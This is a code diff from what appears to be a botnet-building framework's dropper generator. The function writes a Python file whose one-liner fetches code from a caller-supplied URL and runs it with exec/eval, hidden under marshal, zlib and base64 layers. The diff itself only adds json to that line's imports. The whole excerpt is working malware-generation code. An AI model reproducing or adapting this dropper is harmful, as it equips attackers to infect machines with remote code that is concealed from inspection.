@@ -401,7 +401,7 @@ def _dropper(options, **kwargs):
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    dropper = "import zlib,base64,marshal,urllib,json;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
     with open(name, 'w') as fp:
         fp.write(dropper)
     util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
